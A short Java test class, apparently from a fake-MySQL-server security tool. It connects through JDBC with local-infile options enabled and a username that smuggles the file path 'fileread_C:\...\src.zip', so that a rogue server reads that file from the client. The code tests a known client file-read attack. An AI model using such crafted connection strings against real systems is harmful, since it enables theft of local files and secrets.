package me.n1ar4.fake.test.mysql6;

import java.sql.DriverManager;

public class MySQL6Read {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3308/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=65536&user=" +
                "fileread_C:\\Program Files\\Java\\jdk-17\\lib\\src.zip";
        try {
            Class.forName("com.mysql.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
